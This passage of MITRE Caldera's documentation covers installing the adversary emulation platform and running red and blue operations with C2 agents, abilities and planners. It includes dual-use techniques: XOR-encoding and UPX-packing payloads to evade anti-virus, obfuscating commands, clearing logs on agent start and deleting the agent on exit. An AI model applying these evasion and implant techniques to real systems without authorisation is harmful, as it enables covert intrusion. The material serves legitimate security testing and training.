
# Installing MITRE Caldera

Caldera can be installed in four commands using the [concise installation instructions](#concise) and, optionally, be installed and run using a [docker container](#docker-deployment).

## Requirements

Caldera aims to support a wide range of target systems, the core requirements are listed below:

* Linux or MacOS operating system
* Python 3.8 or later (with pip3)
* NodeJS v16 or later (for Caldera v5)
* A modern browser (Google Chrome is recommended)
* The packages listed in the [requirements file](https://github.com/mitre/caldera/blob/master/requirements.txt)

### Recommended

To set up a development environment for Caldera, and to dynamically compile agents, the following is recommended:

* GoLang 1.17+ (for optimal agent functionality)
* Hardware: 8GB+ RAM and 2+ CPUs
* The packages listed in the [dev requirements file](https://github.com/mitre/caldera/blob/master/requirements-dev.txt)

## Installation

### Concise

Caldera can be installed quickly by executing the following 4 commands in your terminal.

```sh
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt
python3 server.py --insecure --build
```

### Step-by-step Explanation

Start by cloning the Caldera repository recursively, pulling all available plugins. It is recommended to pass the desired [version/release](https://github.com/mitre/caldera/releases) (should be in x.x.x format). Cloning any non-release branch, including master, may result in bugs.

In general, the `git clone` command takes the form:

```sh
git clone https://github.com/mitre/caldera.git --recursive --branch x.x.x
```

To install version 5.0.0, one would execute:

```sh
git clone https://github.com/mitre/caldera.git --recursive --branch 5.0.0
```

Once the clone completes, we can jump in to the new `caldera` directory:

```sh
cd caldera
```

Next, install the pip requirements:

```sh
sudo pip3 install -r requirements.txt
```

Finally, start the server (optionally with startup [flags](Server-Configuration.md#startup-parameters) for additional logging):

```sh
python3 server.py --build
```

The `--build` argument is only required on the first boot of the Caldera server, or when latest changes are pulled.

Once started, log in to http://localhost:8888 with the `red` using the password found in the `conf/local.yml` file (this file will be generated on server start).

To learn how to use Caldera, navigate to the Training plugin and complete the capture-the-flag style course.

## Docker Deployment

Caldera can be installed and run in a Docker container.

Start by cloning the Caldera repository recursively, passing the desired version/release in x.x.x format:

```sh
git clone https://github.com/mitre/caldera.git --recursive --branch x.x.x
```

Next, build the docker image, changing the image tag as desired.

```sh
cd caldera
docker build --build-arg WIN_BUILD=true . -t caldera:server
```

Alternatively, you can use the `docker-compose.yml` file by running:

```sh
docker-compose build
```

Finally, run the docker Caldera server, changing port forwarding as required.  More information on Caldera's configuration is [available here](Server-Configuration.md#configuration-file).

```sh
docker run -p 7010:7010 -p 7011:7011/udp -p 7012:7012 -p 8888:8888 caldera:server
```

To gracefully terminate your docker container, do the following:

```
# Find the container ID for your docker container running Caldera
docker ps

# Send interrupt signal, e.g. "docker kill --signal=SIGINT 5b9220dd9c0f"
docker kill --signal=SIGINT [container ID]
```

## Offline Installation

It is possible to use pip to install Caldera on a server without internet access. Dependencies will be downloaded to a machine with internet access, then copied to the offline server and installed.

To minimize issues with this approach, the internet machine's platform and Python version should match the offline server. For example, if the offline server runs Python 3.8 on Ubuntu 20.04, then the machine with internet access should run Python 3.8 and Ubuntu 20.04.

Run the following commands on the machine with internet access. These commands will clone the Caldera repository recursively (passing the desired version/release in x.x.x format) and download the dependencies using pip:

```sh
git clone https://github.com/mitre/caldera.git --recursive --branch x.x.x
mkdir caldera/python_deps
pip3 download -r caldera/requirements.txt --dest caldera/python_deps
```

The `caldera` directory now needs to be copied to the offline server (via `scp`, sneakernet, etc).

On the offline server, the dependencies can then be installed with `pip3`:

```sh
pip3 install -r caldera/requirements.txt --no-index --find-links caldera/python_deps
```

Caldera can then be started as usual on the offline server:

```sh
cd caldera
python3 server.py --build
```


# Getting started

MITRE Caldera, as an adversary emulation platform, can be used in several ways. For most users, it will be used to run either offensive (red) or defensive (blue) operations.

Here are the most common use-cases and basic instructions on how to proceed. 

## Autonomous red-team engagements

This is the original Caldera use-case. You can use the framework to build a specific threat (adversary) profile and launch it in a network to see where you may be susceptible. This is good for testing defenses and training blue teams on how to detect threats. 

The following steps will walk through logging in, deploying an agent, selecting an adversary, and running an operation:

1) Log in as a red user. By default, a "red" user is created with a password found in the `conf/local.yml` file (or `conf/default.yml` if using insecure settings).
1) Deploy an agent
   - Navigate to the Agents page and click the "Click here to deploy an agent"
   - Choose the Sandcat agent and platform (victim operating system)
   - Check that the value for `app.contact.http` matches the host and port the Caldera server is listening on
   - Run the generated command on the victim machine. Note that some abilities will require elevated privileges, which would require the agent to be deployed in an elevated shell.
   - Ensure that a new agent appears in the table on the Agents page
1) Choose an adversary profile
   - Navigate to the Adversaries page
   - Select an adversary from the dropdown and review abilities. The "Discovery" and "Hunter" adversaries from the Stockpile plugin are good starting profiles.
1) Run an operation
   - Navigate to the Operations page and add an operation by toggling the View/Add switch
   - Type in a name for the operation
   - Under the basic options, select a group that contains the recently deployed agent ("red" by default)
   - Under the basic options, select the adversary profile chosen in the last step
   - Click the start button to begin the operation
1) Review the operation
   - While the operation is running, abilities will be executed on the deployed agent. Click the stars next to run abilities to view the output.
1) Export operation results
   - Once the operation finishes, users can export operation reports in JSON format by clicking the "Download report"
   button in the operation GUI modal. Users can also export operation event logs in JSON format by clicking the "Download event logs"
   button in the operations modal. The event logs will also be automatically written to disk when the operation finishes.
   For more information on the various export formats and automatic/manual event log generation, see the [Operation Result page](Operation-Results.md).

Next steps may include:

- Running an operation with a different adversary profile
- Creating a new adversary profile
- Creating custom abilities and adding them to an adversary profile
- Running an operation with a different planner (such as batch)

## Autonomous incident-response 

Caldera can be used to perform automated incident response through deployed agents. This is helpful for identifying TTPs that other security tools may not see or block. 

The following steps will walk through logging in to Caldera blue, deploying a blue agent, selecting a defender, and running an operation:

1) Log in as a blue user. By default, a "blue" user is created with a password found in the `conf/local.yml` file (or `conf/default.yml` if using insecure settings).
1) Deploy a blue agent
   - Navigate to the Agents page and click the "Click here to deploy an agent"
   - Choose the Sandcat agent and platform (victim operating system)
   - Check that the value for `app.contact.http` matches the host and port the Caldera server is listening on
   - Run the generated command on the victim machine. The blue agent should be deployed with elevated privileges in most cases.
   - Ensure that a new blue agent appears in the table on the Agents page
1) Choose a defender profile
   - Navigate to the Defenders page
   - Select a defender from the dropdown and review abilities. The "Incident responder" defender is a good starting profile.
1) Choose a fact source. Defender profiles utilize fact sources to determine good vs. bad on a given host.
   - Navigate to the Sources page
   - Select a fact source and review facts. Consider adding facts to match the environment (for example, add a fact with the `remote.port.unauthorized` name and a value of `8000` to detect services running on port 8000)
   - Save the source if any changes were made
1) Run an operation
   - Navigate to the Operations page and add an operation by toggling the View/Add switch
   - Type in a name for the operation
   - Under the basic options, select a group that contains the recently deployed agent ("blue" by default)
   - Under the basic options, select the defender profile chosen previously
   - Under the autonomous menu, select the fact source chosen previously
   - Click the start button to begin the operation
1) Review the operation
   - While the operation is running, abilities will be executed on the deployed agent. Click the stars next to run abilities to view the output.
   - Consider manually running commands (or [using an automated adversary](#autonomous-red-team-engagements)) which will trigger incident response actions (such as starting a service on an unauthorized port)
1) Export operation results
   - Once the operation finishes, users can export operation reports in JSON format by clicking the "Download report"
   button in the operation GUI modal. Users can also export operation event logs in JSON format by clicking the "Download event logs"
   button in the operations modal. The event logs will also be automatically written to disk when the operation finishes.
   For more information on the various export formats and automatic/manual event log generation, see the [Operation Result page](Operation-Results.md).
   

## Manual red-team engagements

Caldera can be used to perform manual red-team assessments using the Manx agent. This is good for replacing or appending existing offensive toolsets in a manual assessment, as the framework can be extended with any custom tools you may have.

The following steps will walk through logging in, deploying a Manx agent, and running manual commands:

1) Log in as a red user
1) Deploy a Manx agent
   - Navigate to the Agents page and click the "Click here to deploy an agent"
   - Choose the Manx agent and platform (victim operating system)
   - Check that the values for `app.contact.http`, `app.contact.tcp`, and `app.contact.udp` match the host and ports the Caldera server is listening on
   - Run the generated command on the victim machine
   - Ensure that a new agent appears in the table on the Agents page
1) Deploy a Manx agent
   - Navigate to the Manx plugin
   - Select the deployed agent in the session dropdown 
   - Run manual commands in the terminal window

## Research on artificial intelligence

Caldera can be used to test artificial intelligence and other decision-making algorithms using the [Mock plugin](https://github.com/mitre/mock). The plugin adds simulated agents and mock ability responses, which can be used to run simulate an entire operation.

To use the mock plugin:

1) With the server stopped, enable the mock plugin. Restart the server.
1) Log in as a red user
1) In the Agents modal, review the simulated agents that have been spun up
1) Run an operation using any adversary against your simulated agents. Note how the operation runs non-deterministically.
1) Adjust the decision logic in a planner, such as the `batch.py` planner in the Stockpile plugin, to test out different theories



# Learning the terminology

## Agents

Agents are software programs that connect back to Caldera at certain intervals to get instructions. Agents communicate with the Caldera server via a _contact_ method, initially defined at agent install.

Installed agents appear in the UI in the Agents dialog. Agents are identified by their unique _paw_ - or paw print.

Caldera includes a number of agent programs, each adding unique functionality. A few examples are listed below:

- Sandcat: A GoLang agent which can communicate through various C2 channels, such as HTTP, Github GIST, or DNS tunneling.
- Manx: A GoLang agent which communicates via the TCP contact and functions as a reverse-shell
- Ragdoll: A Python agent which communicates via the HTML contact

Agents can be placed into a _group_, either at install through command line flags or by editing the agent in the UI. These groups are used when running an operation to determine which agents to execute abilities on.

The group determines whether an agent is a "red agent" or a "blue agent". Any agent started in the "blue" group will be accessible from the blue dashboard. All other agents will be accessible from the red dashboard.

## Abilities and Adversaries 

An ability is a specific ATT&CK tactic/technique implementation which can be executed on running agents. Abilities will include the command(s) to run, the _platforms_ / _executors_ the commands can run on (ex: Windows / PowerShell), payloads to include, and a reference to a module to parse the output on the Caldera server.

Adversary profiles are groups of abilities, representing the tactics, techniques, and procedures (TTPs) available to a threat actor. Adversary profiles are used when running an operation to determine which abilities will be executed. 

## Operations

Operations run abilities on agent groups. Adversary profiles are used to determine which abilities will be run and agent groups are used to determine which agents the abilities will be run on.

The order in which abilities are run is determined by the _planner_. A few examples of planners included, by default, in Caldera are listed below:

- atomic: Run abilities in the adversary profile according to the adversary's atomic ordering 
- batch: Run all abilities in the adversary profile at once
- buckets: Run abilities in the adversary profile grouped by ATT&CK tactic

When an ability is run in an operation, a _link_ is generated for each agent if:

1. All link _facts_ and fact _requirements_ have been fulfilled
2. The agent has an executor that the ability is configured to run on
3. The agent has not yet run the ability, or the ability is marked as repeatable

A fact is an identifiable piece of information about a given computer. Fact names are referenced in ability files and will be replaced with the fact values when a link is created from the ability.

Link commands can be _obfuscated_, depending on the stealth settings of the operation.

Generated links are added to the operation _chain_. The chain contains all links created for the operation.

When an agents checks in, it will collect its instructions. The instructions are then run, depending on the _executor_ used, and results are sent back to the Caldera server.

Then the results are received, Caldera will use a _parser_ to add any collected facts to the operation. Parsers analyze the output of an ability to extract potential facts. If potential facts are allowed through the _fact rules_, the fact is added to the operation for use in future links. 

## Plugins

Caldera is a framework extended by _plugins_. These plugins provide Caldera with extra functionality in some way.

Multiple plugins are included by default in Caldera. A few noteworthy examples are below, though a more complete and detailed list can be found on the [Plugin Library](Plugin-library.md) page:

- Sandcat: The Sandcat agent is the recommended agent for new users
- Stockpile: This plugin holds the majority of open-source abilities, adversaries, planners, and obfuscators created by the Caldera team
- Training: The training plugin walks users through most of Caldera's functionality -- recommended for new users




# Basic Usage

## Agents

### Agent Management

To deploy an agent:

1. Navigate to the Agents module in the side menu under "Campaigns" and click the "Deploy an agent" button
1. Choose an agent (Sandcat is a good one to start with) and a platform (target operating system)
1. Make sure the agent options are correct (e.g. ensure `app.contact.http` matches the expected host and port for the Caldera server)
    - `app.contact.http` represents the HTTP endpoint (including the IP/hostname and port) that the C2 server is listening on for
    agent requests and beacons. Examples: `http://localhost:8888`, `https://10.1.2.3`, `http://myc2domain.com:8080`
    - `agents.implant_name` represents the base name of the agent binary. 
    For Windows agents, `.exe` will be automatically appended to the base name (e.g. `splunkd` will become `splunkd.exe`).
    - `agent.extensions` takes in a comma-separated list of agent extensions to compile with your agent binary.
    When selecting the associated deployment command, this will instruct the C2 server to compile the agent binary with the 
    requested extensions, if they exist. If you just want a basic agent without extensions, leave this field blank.
    See [Sandcat extension documentation](plugins/sandcat/Sandcat-Details.md#extensions) for more information on Sandcat
    extensions.
1. Choose a command to execute on the target machine. If you want your agent to be compiled with the
 extensions from `agent.extensions`, you must select the associated deployment command below: 
 `Compile red-team agent with a comma-separated list of extensions (requires GoLang).`
1. On the target machine, paste the command into the terminal or PowerShell window and execute it
1. The new agent should appear in the table in the Agents tab (if the agent does not appear, check the [Agent Deployment section of the Troubleshooting page](Troubleshooting.md#agent-deployment))

To kill an agent, use the "Kill Agent" button under the agent-specific settings. The agent will terminate on its next beacon.

To remove the agent from Caldera (will not kill the agent), click the red X. Running agents remove from Caldera will reappear when they check in.

### Agent Settings

Several configuration options are available for agents:

* **Beacon Timers**: Set the minimum and maximum seconds the agent will take to beacon home. These timers are applied to all newly-created agents.
* **Watchdog Timer**: Set the number of seconds to wait, once the server is unreachable, before killing an agent. This timer is applied to all newly-created agents.
* **Untrusted Timer**: Set the number of seconds to wait before marking a missing agent as untrusted. Operations will not generate new links for untrusted agents. This is a global timer and will affect all running and newly-created agents.
* **Implant Name**: The base name of newly-spawned agents. If necessary, an extension will be added when an agent is created (e.g. `splunkd` will become `splunkd.exe` when spawning an agent on a Windows machine).
* **Bootstrap Abilities**: A comma-separated list of ability IDs to be run on a new agent beacon. By default, this is set to run a command which clears command history.
* **Deadman Abilities**: A comma-separated list of ability IDs to be run immediately prior to agent termination. The agent must support deadman abilities in order for them to run.

Agents have a number of agent-specific settings that can be modified by clicking on the button under the 'PID' column for the agent:

* **Group**: Agent group
* **Sleep**: Beacon minimum and maximum sleep timers for this specific agent, separated by a forward slash (`/`)
* **Watchdog**: The watchdog timer setting for this specific agent

## Abilities

The majority of abilities are stored inside the Stockpile plugin (`plugins/stockpile/data/abilities`), along the adversary profiles which use them. Abilities created through the UI will be placed in `data/abilities`.

Here is a sample ability:
```
- id: 9a30740d-3aa8-4c23-8efa-d51215e8a5b9
  name: Scan WIFI networks
  description: View all potential WIFI networks on host
  tactic: discovery
  technique:
    attack_id: T1016
    name: System Network Configuration Discovery
  platforms:
    darwin:
      sh:
        command: |
          ./wifi.sh scan
        payload: wifi.sh
    linux:
      sh:
        command: |
          ./wifi.sh scan
        payload: wifi.sh
    windows:
      psh:
        command: |
          .\wifi.ps1 -Scan
        payload: wifi.ps1
```

Things to note:
* Each ability has a random UUID id
* Each ability requires a name, description, ATT&CK tactic and technique information
* Each ability requires a platforms list, which should contain at least 1 block for a supported operating system (platform). Currently, abilities can be created for Windows, Linux, and Darwin (MacOS).
* Abilities can be added to an adversary through the GUI with the 'add ability' button
* The delete_payload field (optional, placed at the top level, expects True or False) specifies whether the agent should remove the payload from the filesystem after the ability completes. The default value, if not provided, is True.
* The singleton field (optional, placed at the top level, expects True or False) specifies that the ability should only be run successfully once - after it succeeds, it should not be run again in the same operation. The default value, if not provided, is False.
* The repeatable field (optional, placed at the top level, expects True or False) specifies that the ability can be repeated as many times as the planner desires. The default value, if not provided, is False.

Please note that only one of singleton or repeatable should be True at any one time - singleton operates at an operational level, and repeatable at an agent level. If both are true at the same time, Caldera may behave unexpected.

For each platform, there should be a list of executors. In the default Sandcat deployment, Darwin and Linux platforms can use sh and Windows can use psh (PowerShell) or cmd (command prompt).

Each platform block consists of a:
* command (required)
* payload (optional)
* uploads (optional)
* cleanup (optional)
* parsers (optional)
* requirements (optional)
* timeout (optional)

**Command**: A command can be 1-line or many and should contain the code you would like the ability to execute. Newlines in the command will be deleted before execution. The command can (optionally) contain variables, which are identified as `#{variable}`.

Prior to execution of a command, Caldera will search for variables within the command and attempt to replace them with values. The values used for substitution depend on the type of the variable in the command: user-defined or global variable. User-defined variables are associated with facts can be filled in with fact values from fact sources or parser output, while _global  variables_ are filled in by Caldera internally and cannot be substituted with fact values.

The following global variables are defined within Caldera:

* `#{server}` references the FQDN of the Caldera server itself. Because every agent may know the location of Caldera differently, using the `#{server}` variable allows you to let the system determine the correct location of the server.
* `#{group}` is the group a particular agent is a part of. This variable is mainly useful for lateral movement, where your command can start an agent within the context of the agent starting it.
* `#{paw}` is the unique identifier - or paw print - of the agent.
* `#{location}` is the location of the agent on the client file system.
* `#{exe_name}` is the executable name of the agent.
* `#{upstream_dest}` is the address of the immediate "next hop" that the agent uses to reach the Caldera server. For agents that directly connect to the server, this will be the same as the `#{server}` value. For agents that use peer-to-peer, this value will be the peer address used.
* `#{origin_link_id}` is the internal link ID associated with running this command used for agent tracking.
* `#{payload}` and `#{payload:<uuid>}` are used primarily in cleanup commands to denote a payload file downloaded by an agent.
* `#{app.*}` are configuration items found in your main Caldera configuration (e.g., `conf/default.yml`) with a prefix of `app.`. Variables starting with `app.` that are not found in the Caldera configuration are not treated as global variables and can be subject to fact substitution.

**Payload**: A comma-separated list of files which the ability requires in order to run. In the windows executor above, the payload is wifi.ps1. This means, before the ability is used, the agent will download wifi.ps1 from Caldera. If the file already exists, it will not download it. You can store any type of file in the payload directories of any plugin.

> Did you know that you can assign functions to execute on the server when specific payloads are requested for download? An example of this is the sandcat.go file. Check the plugins/sandcat/hook.py file to see how special payloads can be handled.

Payloads can be stored as regular files or you can xor (encode) them so the anti-virus on the server-side does not pick them up. To do this, run the app/utility/payload_encoder.py against the file to create an encoded version of it. Then store and reference the encoded payload instead of the original.

> The payload_encoder.py file has a docstring which explains how to use the utility.

Payloads also can be ran through a packer to obfuscate them further from detection on a host machine.  To do this you would put the packer module name in front of the filename followed by a colon ':'.  This non-filename character will be passed in the agent's call to the download endpoint, and the file will be packed before sending it back to the agent. UPX is currently the only supported packer, but adding addition packers is a simple task.

> An example for setting up for a packer to be used would be editing the filename in the payload section of an ability file: - upx:Akagi64.exe

**Uploads**: A list of files which the agent will upload to the C2 server after running the ability command. The filepaths can be specified as local file paths or absolute paths. The ability assumes that these files will exist during the time of upload.

Below is an example ability that uses the `uploads` keyword:

```
---

- id: 22b9a90a-50c6-4f6a-a1a4-f13cb42a26fd
  name: Upload file example
  description: Example ability to upload files
  tactic: exfiltration
  technique:
    attack_id: T1041
    name: Exfiltration Over C2 Channel
  platforms:
    darwin,linux:
      sh:
        command: |
          echo "test" > /tmp/absolutepath.txt;
          echo "test2" > ./localpath.txt;
        cleanup: |
          rm -f /tmp/absolutepath.txt ./localpath.txt;
        uploads:
          - /tmp/absolutepath.txt
          - ./localpath.txt
```

**Cleanup**: An instruction that will reverse the result of the command. This is intended to put the computer back into the state it was before the ability was used. For example, if your command creates a file, you can use the cleanup to remove the file. Cleanup commands run after an operation, in the reverse order they were created. Cleaning up an operation is also optional, which means you can start an operation and instruct it to skip all cleanup instructions. 

Cleanup is not needed for abilities, like above, which download files through the payload block. Upon an operation completing, all payload files will be removed from the client (agent) computers.

**Parsers**: A list of parsing modules which can parse the output of the command into new facts. Interested in this topic? Check out [how Caldera parses facts](Parsers.md), which goes into detail about parsers. 

Abilities can also make use of two Caldera REST API endpoints, file upload and download.

**Requirements**: Required relationships of facts that need to be established before this ability can be used. See [Requirements](Requirements.md) for more information.

**Timeout**: How many seconds to allow the command to run.

### Bootstrap and Deadman Abilities 

Bootstrap Abilities are abilities that run immediately after sending their first beacon in. A bootstrap ability can be added through the GUI by entering the ability id into the 'Bootstrap Abilities' field in the 'Agents' tab. Alternatively, you can edit the `conf/agents.yml` file and include the ability id in the bootstrap ability section of the file (ensure the server is turned off before editing any configuration files).

Deadman Abilities are abilities that an agent runs just before graceful termination. When the Caldera server receives an initial beacon from an agent that supports deadman abilities, the server will immediately send the configured deadman abilities, along with any configured bootstrap abilities, to the agent. The agent will save the deadman abilities and execute them if terminated via the GUI or if self-terminating due to watchdog timer expiration or disconnection from the C2. Deadman abilities can be added through the GUI by entering a comma-separated list of ability IDs into the 'Deadman Abilities' field in the 'Agents' tab. Alternatively, you can edit the 'conf/agents.yml' file and include the ability ID in the 'deadman_abilities' section of the file (ensure the server is turned off before editing any configuration files).

Below is an example `conf/agents.yml` file with configured bootstrap and deadman abilities:

```
bootstrap_abilities:
- 43b3754c-def4-4699-a673-1d85648fda6a # Clear and avoid logs
deadman_abilities:
- 5f844ac9-5f24-4196-a70d-17f0bd44a934 # delete agent executable upon termination
implant_name: splunkd
sleep_max: 60
sleep_min: 30
untrusted_timer: 90
watchdog: 0
deployments:
  - 2f34977d-9558-4c12-abad-349716777c6b #Sandcat
  - 356d1722-7784-40c4-822b-0cf864b0b36d #Manx
  - 0ab383be-b819-41bf-91b9-1bd4404d83bf #Ragdoll
```

## Adversary Profiles

The majority of adversary profiles are stored inside the Stockpile plugin (`plugins/stockpile/data/adversaries`). Adversary profiles created through the UI will be placed in `data/adversaries`.

Adversaries consist of an objective (optional) and a list of abilities under atomic_ordering. This ordering determines the order in which abilities will be run.

An example adversary is below:

```
id: 5d3e170e-f1b8-49f9-9ee1-c51605552a08
name: Collection
description: A collection adversary
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
    - 1f7ff232-ebf8-42bf-a3c4-657855794cfe #find company emails
    - d69e8660-62c9-431e-87eb-8cf6bd4e35cf #find ip addresses
    - 90c2efaa-8205-480d-8bb6-61d90dbaf81b #find sensitive files
    - 6469befa-748a-4b9c-a96d-f191fde47d89 #create staging dir
```

## Operations

An operation can be started with a number of optional configurations:

* **Group**: Which collection of agents would you like to run against
* **Adversary**: Which adversary profile would you like to run
* **Auto-close**: Automatically close the operation when there is nothing left to do. Alternatively, keep the operation forever.
* **Run immediately**: Run the operation immediately or start in a paused state
* **Autonomous**: Run autonomously or manually. Manual mode will ask the operator to approve or discard each command.
* **Planner**: You can select which logic library - or planner - you would like to use.
* **Fact source**: You can attach a source of facts to an operation. This means the operation will start with "pre-knowledge" of the facts, which it can use to fill in variables inside the abilities.
* **Cleanup timeout**: How many seconds to wait for each cleanup command to complete before continuing.
* **Obfuscators**: Select an obfuscator to encode each command with, before they are sent to the agents.
* **Jitter**: Agents normally check in with Caldera every 60 seconds. Once they realize they are part of an active operation, agents will start checking in according to the jitter time, which is by default 2/8. This fraction tells the agents that they should pause between 2 and 8 seconds (picked at random each time an agent checks in) before using the next ability. 
* **Visibility**: How visible should the operation be to the defense. Defaults to 51 because each ability defaults to a visibility of 50. Abilities with a higher visibility than the operation visibility will be skipped.

After starting an operation, users can export the operation report in JSON format by clicking the "Download report" button in the operation GUI modal. For more information on the operation report format, see the [Operation Result](Operation-Results.md) section.

## Facts

A fact is an identifiable piece of information about a given computer. Facts can be used to perform variable assignment within abilities.

Facts are composed of the following:

* **name**: a descriptor which identifies the type of the fact and can be used for variable names within abilities. Example: `host.user.name`. Note that Caldera 3.1.0 and earlier required fact names/traits to be formatted as `major.minor.specific` but this is no longer a requirement.
* **value**: any arbitrary string. An appropriate value for a `host.user.name` may be "Administrator" or "John".
* **score**: an integer which associates a relative importance for the fact. Every fact, by default, gets a score of 1. If a `host.user.password` fact is important or has a high chance of success if used, you may assign it a score of 5. When an ability uses a fact to fill in a variable, it will use those with the highest scores first. If a fact has a score of 0, it will be blocklisted - meaning it cannot be used in the operation.

> If a property has a prefix of `host.` (e.g., `host.user.name`) you can ensure that the fact will only be used by the host that collected it if you add the `plugins.stockpile.app.requirements.paw_provenance` requirement to the ability using the fact.

As hinted above, when Caldera runs abilities, it scans the command and cleanup instructions for variables. When it finds one, it then looks at the facts it has and sees if it can replace the variables with matching facts (based on the property). It will then create new variants of each command/cleanup instruction for each possible combination of facts it has collected. Each variant will be scored based on the cumulative score of all facts inside the command. The highest scored variants will be executed first.

Facts can be added or modified through the GUI by navigating to *Advanced -> Sources* and clicking on '+ add row'.

## Fact sources

A fact source is a collection of facts that you have grouped together. A fact source can be applied to an operation when you start it, which gives the operation facts to fill in variables with. 

Fact sources can be added or modified through the GUI by navigating to *Advanced -> Sources*.

## Rules

A rule is a way of restricting or placing boundaries on Caldera. Rules are directly related to facts and should be included in a fact sheet.

Rules act similar to firewall rules and have three key components: fact, action, and match

1. **Fact** specifies the name of the fact that the rule will apply to
2. **Action** (ALLOW, DENY) will allow or deny the fact from use if it matches the rule
3. **Match** regex rule on a fact's value to determine if the rule applies

During an operation, the planning service matches each link against the rule-set, discarding it if any of the fact assignments in the link match a rule specifying DENY and keeping it otherwise. In the case that multiple rules match the same fact assignment, the last one listed will be given priority.

**Example**

```
rules:
  - action: DENY
    fact: file.sensitive.extension
    match: .*
  - action: ALLOW
    fact: file.sensitive.extension
    match: txt
```

In this example only the txt file extension will be used. Note that the ALLOW action for txt supersedes the DENY for all, as the ALLOW rule is listed later in the policy. If the ALLOW rule was listed first, and the DENY rule second, then all values (including txt) for file.sensitive.extension would be discarded.

### Subnets

Rules can also match against subnets.

**Subnet Example**

```
  - action: DENY
    fact: my.host.ip
    match: .*
  - action: ALLOW
    fact: my.host.ip
    match: 10.245.112.0/24
```

In this example, the rules would permit Caldera to only operate within the 10.245.112.1 to 10.245.112.254 range.

Rules can be added or modified through the GUI by navigating to *Advanced -> Sources* and clicking on '+ view rules'.

### Fact Source Adjustments

Fact source adjustments allow for dynamic adjustment specific ability's `visibility` in the context of an operation.

**Adjustment Example (`basic` fact source)**

```
  adjustments:
    1b4fb81c-8090-426c-93ab-0a633e7a16a7:
      host.installed.av:
        - value: symantec
          offset: 3
        - value: mcafee
          offset: 3
```

In this example, if in the process of executing an operation, a `host.installed.av` fact was found with either the value `symantec` or `mcafee`, ability `1b4fb81c-8090-426c-93ab-0a633e7a16a7` (Sniff network traffic) would have its visibility score raised and the status `HIGH_VIZ`.  This framework allows dynamic adjustments to expected ability visibility based on captured facts (in this example the presence of anti-virus software on the target) which may impact our desire to run the ability, as it might be more easily detected in this environment.

When the "Sniff network traffic" ability is run, its visibility is *only* adjusted if, at the time of execution, the fact source has a `host.installed.av` fact with either the value `symantec` or `mcafee`.  If one or both of these facts are present, each execution of "Sniff network traffic" will have `3` (the value of it's `offset`) added to its visibility score.  This visibility adjustment is recorded in the operation report.

Adjustments must be added or modified through the fact source's `.yml` file, with the exception of new fact sources created using the REST API's `sources` endpoint with a well-formed `PUT` request.

## Planners

A planner is a module within Caldera which contains logic for how a running operation should make decisions about which abilities to use and in what order.

Planners are single module Python files. Planners utilize the core system’s planning_svc.py, which has planning logic useful for various types of planners.

### The Atomic planner

Caldera ships with a default planner, _atomic_. The _atomic_ planner operates by atomically sending a single ability command to each agent in the operation's group at a time, progressing through abilities as they are enumerated in the underlying adversary profile. When a new agent is added to the operation, the _atomic_ planner will start with the first ability in the adversary profile.

The _atomic_ planner can be found in the `mitre/stockpile` GitHub repository at `app/atomic.py`.
 
### Custom Planners

For any other planner behavior and functionality, a custom planner is required. Caldera has open sourced some custom planners, to include the _batch_ and _buckets_ planners. From time to time, the Caldera team will open source further planners as they become more widely used, publicly available, etc.

The _batch_ planner will retrieve all ability commands available and applicable for the operation and send them to the agents found in the operation's group. The _batch_ planner uses the planning service to retrieve ability commands based on the chosen advsersary and known agents in the operation. The abilities returned to the _batch_ planner are based on the agent matching the operating system (execution platform) of the ability and the ability command having no unsatisfied facts. The _batch_ planner will then send these ability commands to the agents and wait for them to be completed. After each batch of ability commands is completed, the _batch_ planner will again attempt to retrieve all ability commands available for the operation and attempt to repeat the cycle. This is required as once ability commands are executed, new additional ability commands may also become unlocked; e.g. required facts being present now, newly spawned agents, etc. The _batch_ planner should be used for profiles containing repeatable abilities.

The _buckets_ planner is an example planner to demonstrate how to build a custom planner as well as the planning service utilities available to planners to aid in the formation decision logic.

The _batch_ and _buckets_ planners can be found in the `mitre/stockpile` github repository at `app/batch.py` and `app/buckets.py`.

See [How to Build Planners](How-to-Build-Planners.md) for full walkthrough of how to build a custom planner and incorporate any custom decision logic that is desired.

### Repeatable Abilities and Planners

When creating a new operation, selecting a profile with repeatable abilities will disable both the _atomic_ and the _buckets_ planners. Due to the behavior and functionality of these planners, repeatable abilities will result in the planner looping infinitely on the repeatable ability. It is recommended to use the _batch_ planner with profiles containing repeatable abilities.

## Plugins

Caldera is built using a plugin architecture on top of the core system. Plugins are separate git repositories that plug new features into the core system. Each plugin resides in the plugins directory and is loaded into Caldera by adding it to the local.yml file.

Plugins can be added through the UI or in the configuration file (likely `conf/local.yml`). Changes to the configuration file while the server is shut down. The plugins will be enabled when the server restarts.

Each plugin contains a single hook.py file in its root directory. This file should contain an initialize function, which gets called automatically for each loaded plugin when Caldera boots. The initialize function contains the plugin logic that is getting "plugged into" the core system. This function takes a single parameter:

- **services**: a list of core services that live inside the core system. 

A plugin can add nearly any new functionality/features to Caldera by using the two objects above. 

A list of plugins included with Caldera can be found on the [Plugin library](Plugin-library.md) page.



# Server Configuration

## Startup parameters

`server.py` supports the following arguments:

- `--log {DEBUG,INFO,WARNING,ERROR,CRITICAL}`: Sets the log option. The `DEBUG` option is useful for troubleshooting.
- `--fresh`: Resets all non-plugin data including custom abilities and adversaries, operations, and the agent list.
  A gzipped, tarball backup of the original content is stored in the `data/backup` directory. This makes it possible to 
  recover the server state after an accidental `--fresh` startup by running `tar -zxvf data/backup/backup-<timestamp>.tar.gz`
  from the root caldera directory before server startup.
- `--environment ENVIRONMENT`: Sets a custom configuration file. See "Custom configuration files" below for additional details.
- `--plugins PLUGINS`: Sets Caldera to run only with the specified plugins
- `--insecure`: Uses the `conf/default.yml` file for configuration, not recommended.

## Configuration file

Caldera's configuration file is located at `conf/local.yml`, written on the first run. If the server is run with the `--insecure` option (not recommended), Caldera will use the file located at `conf/default.yml`.

Configuration file changes must be made while the server is shut down. Any changes made to the configuration file while the server is running will be overwritten.

The value set for `app.frontend.api_base_url` is used to configure the Caldera v5 Vue UI when the Caldera server is started with the `--build` flag. It has been observed that in some situations the default configuration values can cause the UI to appear unresponsive due to misrouted requests. This mainly occurs when the server is running on a host different than the UI is being accessed from. In these cases, the value should be changed to the appropriate URL for the UI to route requests to.

The YAML configuration file contains all the configuration variables Caldera requires to boot up and run. A documented configuration file is below:

```yaml
ability_refresh: 60  # Interval at which ability YAML files will refresh from disk 
api_key_blue: BLUEADMIN123  # API key which grants access to Caldera blue
